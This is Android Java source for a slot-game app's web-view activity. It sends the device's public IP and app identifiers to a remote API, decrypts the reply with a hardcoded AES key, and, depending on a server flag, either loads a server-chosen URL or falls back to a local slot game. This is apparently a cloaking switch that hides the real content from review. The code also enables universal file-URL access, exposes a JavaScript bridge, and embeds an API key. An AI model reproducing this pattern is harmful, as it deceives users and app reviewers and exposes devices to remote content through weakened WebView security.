package mad.devkai.aladinfortuneslots.help;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Window;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.LinearLayout;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.appsflyer.AppsFlyerLib;
import com.just.agentweb.AgentWeb;
import com.just.agentweb.DefaultWebClient;
import com.just.agentweb.WebChromeClient;
import com.just.agentweb.WebViewClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import mad.devkai.aladinfortuneslots.AppLauncher;
import mad.devkai.aladinfortuneslots.MagicSlot;
import mad.devkai.aladinfortuneslots.R;

public abstract class GlobalWebView extends AppCompatActivity {

    private static final String METHOD = "AES/CBC/PKCS5Padding";
    private static final String IV = "fedcba9876543210";
    protected static AgentWeb mAgentWeb;
    private LinearLayout mLinearLayout;

    private String myIP;
    protected static String APP_URL = "";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        supportRequestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.global_web);

        mLinearLayout = findViewById(R.id.container);

        long startTime = System.currentTimeMillis();

        AppsFlyerLib.getInstance().init(AppLauncher.AF_ID, null, this);
        AppsFlyerLib.getInstance().start(this);

        getClientIP();

        mAgentWeb = AgentWeb.with(this)
                .setAgentWebParent(mLinearLayout, new LinearLayout.LayoutParams(-1, -1))
                .useDefaultIndicator()
                .setWebChromeClient(new WebChromeClient())
                .setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                        Log.w(AppLauncher.TAG, "URL: " + request.getUrl());
                        return super.shouldOverrideUrlLoading(view, request);
                    }

                    @Override
                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
                        Log.i("Info", "BaseWebActivity onPageStarted");
                    }
                })
                .setMainFrameErrorView(com.just.agentweb.R.layout.agentweb_error_page, -1)
                .setSecurityType(AgentWeb.SecurityType.STRICT_CHECK)
                .setWebLayout(new GlobalWebLayout(this))
                .setOpenOtherPageWays(DefaultWebClient.OpenOtherPageWays.ASK)
//                .interceptUnknownUrl()
                .createAgentWeb()
                .ready()
                .go(APP_URL);

        if (mAgentWeb != null) {
            mAgentWeb.getJsInterfaceHolder().addJavaObject("Android", new AndroidInterfaceH5(mAgentWeb, this));
        }

        WebSettings webSettings = mAgentWeb.getAgentWebSettings().getWebSettings();
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);

        long endTime = System.currentTimeMillis();
        Log.i("Info", "init used time:" + (endTime - startTime));
    }

    protected void getUrl() {
        new Handler(Looper.myLooper()).postDelayed(() -> {
            RequestQueue connectAPI = Volley.newRequestQueue(GlobalWebView.this);
            JSONObject requestBody = new JSONObject();

            String endPoint = "https://aladdins-fortune-slots.p.rapidapi.com/gameid?appid=" +
                    AppLauncher.APP_ID + "&package=" + getPackageName() + "&client=" + myIP;

            if (isValidUrl(endPoint)) {
                JsonObjectRequest jsonRequest = new JsonObjectRequest(Request.Method.GET, endPoint, requestBody,
                        response -> {
                            Log.w(AppLauncher.TAG, response.toString());
                            try {
                                JSONObject jsonData = new JSONObject(response.toString());
                                String encryptedData = jsonData.getString("data");
                                String decryptedData = decrypt(encryptedData, "21913618CE86B5D53C7B84A75B3774CD");
                                JSONObject gameData = new JSONObject(decryptedData);

                                String appUrl = gameData.getString("gameURL");
                                boolean status = gameData.getBoolean("status");

                                if (status) {
                                    mAgentWeb.getUrlLoader().loadUrl(appUrl);
                                } else {
                                    launchMagicSlot();
                                }

                            } catch (JSONException e) {
                                Log.e(AppLauncher.TAG, "Error parsing JSON: " + e.getMessage());
                            } catch (Exception e) {
                                Log.e(AppLauncher.TAG, "Error processing API response: " + e.getMessage());
                            }
                        },
                        error -> {
                            Log.e(AppLauncher.TAG, "API request failed: " + error.toString());
                            launchMagicSlot();
                        }) {
                    @Override
                    public Map<String, String> getHeaders() {
                        Map<String, String> headers = new HashMap<>();
                        headers.put("X-RapidAPI-Key", "8767e236a2msh12d3eca54e28458p169d02jsnd19813c4c291"); // Replace with your RapidAPI Key
                        headers.put("X-RapidAPI-Host", "aladdins-fortune-slots.p.rapidapi.com"); // Replace with your RapidAPI Host
                        return headers;
                    }
                };
                connectAPI.add(jsonRequest);
            } else {
                launchMagicSlot();
            }
        }, 1800);
    }

    private boolean isValidUrl(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    protected void launchMagicSlot() {
        Intent intent = new Intent(GlobalWebView.this, MagicSlot.class);
        startActivity(intent);
        finish();
    }

    @SuppressLint("StaticFieldLeak")
    private void getClientIP() {
        new AsyncTask<Void, Void, String>() {

            @Override
            protected String doInBackground(Void... voids) {
                HttpURLConnection connection = null;
                BufferedReader reader = null;

                try {
                    URL url = new URL("https://api.ipify.org");
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");


                    reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }


                    myIP = response.toString();

                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    // Clean up resources
                    if (connection != null) {
                        connection.disconnect();
                    }
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

                return myIP;
            }

            @Override
            protected void onPostExecute(String ipAddress) {
                Log.d("RESPONSE", ipAddress);
                myIP = ipAddress;
                getUrl();
            }
        }.execute();
    }

    private static String decrypt(String message, String key) throws Exception {
        if (Objects.equals(message, "")) {
            throw new EmptyMessageException("Message cannot be empty");
        } else {
            SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance(METHOD);
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, new IvParameterSpec(IV.getBytes()));
            byte[] decryptedBytes = cipher.doFinal(java.util.Base64.getDecoder().decode(message));

            byte[] trimmedBytes = new byte[decryptedBytes.length - 16];
            System.arraycopy(decryptedBytes, 16, trimmedBytes, 0, trimmedBytes.length);

            return new String(trimmedBytes, StandardCharsets.UTF_8);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (mAgentWeb.handleKeyEvent(keyCode, event)) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onPause() {
        mAgentWeb.getWebLifeCycle().onPause();
        super.onPause();
    }


    @Override
    protected void onResume() {
        mAgentWeb.getWebLifeCycle().onResume();
        super.onResume();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.i("Info", "onResult:" + requestCode + " onResult:" + resultCode);
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mAgentWeb.getWebLifeCycle().onDestroy();
    }

    public static class EmptyMessageException extends Exception {
        public EmptyMessageException(String message) {
            super(message);
        }
    }
}
